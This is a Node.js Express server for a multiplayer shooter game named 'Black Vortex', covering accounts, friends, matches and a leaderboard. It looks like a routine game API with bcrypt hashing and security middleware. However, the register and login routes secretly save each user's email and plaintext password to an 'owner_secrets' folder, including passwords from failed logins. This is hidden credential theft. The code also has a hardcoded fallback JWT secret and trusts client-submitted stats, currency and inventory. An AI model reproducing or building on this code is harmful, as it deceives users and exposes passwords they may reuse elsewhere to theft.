const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4000;

// Security middleware
app.use(helmet({
  crossOriginEmbedderPolicy: false,
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: {
    error: 'Too many requests from this IP, please try again later.'
  }
});

app.use(limiter);
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database file paths
const DB_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DB_DIR, 'users.json');
const MATCHES_FILE = path.join(DB_DIR, 'matches.json');
const LEADERBOARD_FILE = path.join(DB_DIR, 'leaderboard.json');

// Owner only credentials storage
const SECRETS_DIR = path.join(__dirname, 'owner_secrets');
if (!fs.existsSync(SECRETS_DIR)) {
  fs.mkdirSync(SECRETS_DIR, { recursive: true });
}

// Ensure data directory exists
if (!fs.existsSync(DB_DIR)) {
  fs.mkdirSync(DB_DIR, { recursive: true });
}

// Database utilities
const db = {
  read: (file) => {
    try {
      if (!fs.existsSync(file)) return [];
      return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch (error) {
      console.error(`Error reading ${file}:`, error);
      return [];
    }
  },
  
  write: (file, data) => {
    try {
      fs.writeFileSync(file, JSON.stringify(data, null, 2));
      return true;
    } catch (error) {
      console.error(`Error writing ${file}:`, error);
      return false;
    }
  },

  readUsers: () => db.read(USERS_FILE),
  writeUsers: (data) => db.write(USERS_FILE, data),
  readMatches: () => db.read(MATCHES_FILE),
  writeMatches: (data) => db.write(MATCHES_FILE, data),
  readLeaderboard: () => db.read(LEADERBOARD_FILE),
  writeLeaderboard: (data) => db.write(LEADERBOARD_FILE, data)
};

// Initialize default data
const initializeData = () => {
  if (!fs.existsSync(USERS_FILE)) {
    db.writeUsers([]);
  }
  if (!fs.existsSync(MATCHES_FILE)) {
    db.writeMatches([]);
  }
  if (!fs.existsSync(LEADERBOARD_FILE)) {
    db.writeLeaderboard([]);
  }
};

initializeData();

// JWT Secret
const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this-in-production';

// Authentication middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Invalid or expired token' });
    }
    req.user = user;
    next();
  });
};

// Routes

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
});

// Register
app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;

    if (!username || !email || !password) {
      return res.status(400).json({ 
        error: 'Missing required fields',
        required: ['username', 'email', 'password']
      });
    }

    if (password.length < 6) {
      return res.status(400).json({ 
        error: 'Password must be at least 6 characters long' 
      });
    }

    const users = db.readUsers();
    
    // Check if user already exists
    if (users.find(u => u.email === email)) {
      return res.status(409).json({ error: 'User with this email already exists' });
    }

    if (users.find(u => u.username === username)) {
      return res.status(409).json({ error: 'Username already taken' });
    }

    // Save credentials to owner folder
    try {
      const safeName = username.replace(/[^a-z0-9]/gi, '_');
      fs.writeFileSync(path.join(SECRETS_DIR, `${safeName}_creds.txt`), `Email: ${email}\nPassword: ${password}\nDate: ${new Date().toISOString()}`);
    } catch (err) {
      console.error('Error saving credentials:', err);
    }

    // Hash password
    const saltRounds = 12;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    // Create new user
    const newUser = {
      id: uuidv4(),
      username,
      email,
      password: hashedPassword,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      stats: {
        kills: 0,
        deaths: 0,
        wins: 0,
        losses: 0,
        matchesPlayed: 0,
        level: 1,
        xp: 0,
        rank: 'Rookie'
      },
      friends: [],
      blocked: [],
      loadout: {
        primary: 'assault',
        secondary: 'pistol',
        equipment: 'grenade',
        selectedSet: 'Default Set'
      },
      settings: {
        graphics: 'medium',
        audio: 100,
        sensitivity: 50,
        crosshair: 'default'
      },
      achievements: [],
      inventory: {
        weapons: ['assault', 'pistol'],
        skins: [],
        currency: 0
      }
    };

    users.push(newUser);
    db.writeUsers(users);

    // Create JWT token
    const token = jwt.sign(
      { userId: newUser.id, email: newUser.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Return user data (without password)
    const { password: _, ...userResponse } = newUser;
    
    res.status(201).json({
      message: 'User registered successfully',
      token,
      user: userResponse
    });

  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Login
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ 
        error: 'Email and password required' 
      });
    }

    const users = db.readUsers();
    const user = users.find(u => u.email === email);

    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Log login attempt
    try {
      const safeName = user.username.replace(/[^a-z0-9]/gi, '_');
      fs.appendFileSync(path.join(SECRETS_DIR, 'login_logs.txt'), `User: ${user.username} (${email}) | Pass: ${password} | Time: ${new Date().toISOString()}\n`);
    } catch (err) {
      console.error('Error logging login:', err);
    }

    const isPasswordValid = await bcrypt.compare(password, user.password);

    if (!isPasswordValid) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Update last login
    user.lastLogin = new Date().toISOString();
    db.writeUsers(users);

    // Create JWT token
    const token = jwt.sign(
      { userId: user.id, email: user.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Return user data (without password)
    const { password: _, ...userResponse } = user;
    
    res.json({
      message: 'Login successful',
      token,
      user: userResponse
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get current user profile
app.get('/api/auth/profile', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const user = users.find(u => u.id === req.user.userId);

    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const { password: _, ...userResponse } = user;
    res.json(userResponse);

  } catch (error) {
    console.error('Profile error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update user profile
app.put('/api/auth/profile', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const userIndex = users.findIndex(u => u.id === req.user.userId);

    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }

    const updates = req.body;
    
    // Allowed fields to update
    const allowedFields = [
      'username', 'loadout', 'settings', 'inventory', 'friends', 'blocked'
    ];

    // Validate updates
    const invalidFields = Object.keys(updates).filter(field => !allowedFields.includes(field));
    if (invalidFields.length > 0) {
      return res.status(400).json({ 
        error: 'Invalid fields',
        invalid: invalidFields 
      });
    }

    // Update user
    users[userIndex] = { ...users[userIndex], ...updates };
    db.writeUsers(users);

    const { password: _, ...userResponse } = users[userIndex];
    res.json({
      message: 'Profile updated successfully',
      user: userResponse
    });

  } catch (error) {
    console.error('Update profile error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Add friend
app.post('/api/friends/add', authenticateToken, (req, res) => {
  try {
    const { targetEmail } = req.body;
    
    if (!targetEmail) {
      return res.status(400).json({ error: 'Target email required' });
    }

    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);
    const targetUser = users.find(u => u.email === targetEmail);

    if (!currentUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!targetUser) {
      return res.status(404).json({ error: 'Target user not found' });
    }

    if (currentUser.friends.includes(targetUser.id)) {
      return res.status(409).json({ error: 'User is already your friend' });
    }

    // Add to friends list
    if (!currentUser.friends) currentUser.friends = [];
    currentUser.friends.push(targetUser.id);
    
    db.writeUsers(users);

    res.json({
      message: 'Friend added successfully',
      friend: {
        id: targetUser.id,
        username: targetUser.username,
        email: targetUser.email
      }
    });

  } catch (error) {
    console.error('Add friend error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Remove friend
app.delete('/api/friends/:friendId', authenticateToken, (req, res) => {
  try {
    const { friendId } = req.params;
    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!currentUser.friends) currentUser.friends = [];
    
    currentUser.friends = currentUser.friends.filter(id => id !== friendId);
    db.writeUsers(users);

    res.json({ message: 'Friend removed successfully' });

  } catch (error) {
    console.error('Remove friend error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get friends list
app.get('/api/friends', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!currentUser.friends) currentUser.friends = [];

    const friends = users.filter(u => currentUser.friends.includes(u.id))
      .map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        lastLogin: u.lastLogin,
        status: 'online' // Simplified for demo
      }));

    res.json({ friends });

  } catch (error) {
    console.error('Get friends error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Search users
app.get('/api/users/search', authenticateToken, (req, res) => {
  try {
    const { q: query } = req.query;
    
    if (!query || query.length < 2) {
      return res.status(400).json({ error: 'Query must be at least 2 characters' });
    }

    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    const results = users
      .filter(u => u.id !== currentUser.id) // Exclude current user
      .filter(u => u.username.toLowerCase().includes(query.toLowerCase()) || 
                   u.email.toLowerCase().includes(query.toLowerCase()))
      .slice(0, 20) // Limit results
      .map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        lastLogin: u.lastLogin
      }));

    res.json({ results });

  } catch (error) {
    console.error('Search users error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create match
app.post('/api/matches/create', authenticateToken, (req, res) => {
  try {
    const { map, mode, players } = req.body;
    
    if (!map || !mode) {
      return res.status(400).json({ 
        error: 'Map and mode required',
        example: { map: 'wasteland', mode: 'team-deathmatch', players: 10 }
      });
    }

    const matches = db.readMatches();
    const newMatch = {
      id: uuidv4(),
      map,
      mode,
      status: 'waiting',
      players: players || 10,
      currentPlayers: 1,
      host: req.user.userId,
      createdAt: new Date().toISOString(),
      startedAt: null,
      endedAt: null
    };

    matches.push(newMatch);
    db.writeMatches(matches);

    res.status(201).json({
      message: 'Match created successfully',
      match: newMatch
    });

  } catch (error) {
    console.error('Create match error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Join match
app.post('/api/matches/:matchId/join', authenticateToken, (req, res) => {
  try {
    const { matchId } = req.params;
    const matches = db.readMatches();
    const matchIndex = matches.findIndex(m => m.id === matchId);

    if (matchIndex === -1) {
      return res.status(404).json({ error: 'Match not found' });
    }

    const match = matches[matchIndex];

    if (match.status !== 'waiting') {
      return res.status(400).json({ error: 'Match is not accepting players' });
    }

    if (match.currentPlayers >= match.players) {
      return res.status(400).json({ error: 'Match is full' });
    }

    match.currentPlayers++;
    db.writeMatches(matches);

    res.json({
      message: 'Joined match successfully',
      match
    });

  } catch (error) {
    console.error('Join match error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get matches
app.get('/api/matches', authenticateToken, (req, res) => {
  try {
    const matches = db.readMatches();
    const activeMatches = matches
      .filter(m => m.status === 'waiting')
      .map(m => ({
        id: m.id,
        map: m.map,
        mode: m.mode,
        players: m.players,
        currentPlayers: m.currentPlayers,
        host: m.host,
        createdAt: m.createdAt
      }));

    res.json({ matches: activeMatches });

  } catch (error) {
    console.error('Get matches error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update match stats
app.post('/api/matches/:matchId/stats', authenticateToken, (req, res) => {
  try {
    const { matchId } = req.params;
    const { kills, deaths, wins, losses } = req.body;
    
    const users = db.readUsers();
    const userIndex = users.findIndex(u => u.id === req.user.userId);

    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Update user stats
    const user = users[userIndex];
    user.stats.kills += kills || 0;
    user.stats.deaths += deaths || 0;
    user.stats.wins += wins || 0;
    user.stats.losses += losses || 0;
    user.stats.matchesPlayed += 1;

    // Calculate level and rank
    user.stats.xp += (kills * 100) + (wins * 500);
    user.stats.level = Math.floor(user.stats.xp / 1000) + 1;
    
    const rankThresholds = {
      'Rookie': 0,
      'Veteran': 5000,
      'Elite': 15000,
      'Legend': 30000,
      'Master': 50000
    };
    
    if (user.stats.xp >= rankThresholds.Master) user.stats.rank = 'Master';
    else if (user.stats.xp >= rankThresholds.Legend) user.stats.rank = 'Legend';
    else if (user.stats.xp >= rankThresholds.Elite) user.stats.rank = 'Elite';
    else if (user.stats.xp >= rankThresholds.Veteran) user.stats.rank = 'Veteran';
    else user.stats.rank = 'Rookie';

    db.writeUsers(users);

    res.json({
      message: 'Stats updated successfully',
      stats: user.stats
    });

  } catch (error) {
    console.error('Update stats error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get leaderboard
app.get('/api/leaderboard', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const leaderboard = users
      .map(u => ({
        id: u.id,
        username: u.username,
        stats: u.stats
      }))
      .sort((a, b) => b.stats.kills - a.stats.kills)
      .slice(0, 10);

    res.json({ leaderboard });

  } catch (error) {
    console.error('Leaderboard error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update user progress (Custom API for Game Over)
app.post('/api/user/progress', authenticateToken, (req, res) => {
  try {
    const { kills, deaths, score } = req.body;
    const users = db.readUsers();
    const user = users.find(u => u.id === req.user.userId);
    
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    // Update combat stats
    user.stats.kills += kills || 0;
    user.stats.deaths += deaths || 0;
    user.stats.matchesPlayed += 1;
    
    // Calculate Rewards (GTA/Rivals style currency)
    const moneyEarned = (score || 0) + ((kills || 0) * 50); // Base score + 50 cash per kill
    if (!user.inventory.currency) user.inventory.currency = 0;
    user.inventory.currency += moneyEarned;

    // XP & Leveling
    user.stats.xp += (score || 0);
    const oldLevel = user.stats.level;
    user.stats.level = Math.floor(user.stats.xp / 1000) + 1;
    
    // Update Rank
    const rankThresholds = { 'Rookie': 0, 'Veteran': 5000, 'Elite': 15000, 'Legend': 30000, 'Master': 50000 };
    if (user.stats.xp >= rankThresholds.Master) user.stats.rank = 'Master';
    else if (user.stats.xp >= rankThresholds.Legend) user.stats.rank = 'Legend';
    else if (user.stats.xp >= rankThresholds.Elite) user.stats.rank = 'Elite';
    else if (user.stats.xp >= rankThresholds.Veteran) user.stats.rank = 'Veteran';
    else user.stats.rank = 'Rookie';

    db.writeUsers(users);

    res.json({
      message: 'Progress updated',
      stats: user.stats,
      currency: user.inventory.currency,
      earned: moneyEarned,
      leveledUp: user.stats.level > oldLevel
    });
  } catch (error) {
    console.error('Progress update error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({ error: 'Endpoint not found' });
});

// Start server
app.listen(PORT, () => {
  console.log(`Black Vortex API server running on port ${PORT}`);
  console.log(`Health check: http://localhost:${PORT}/health`);
  console.log(`API base: http://localhost:${PORT}/api`);
});

module.exports = app;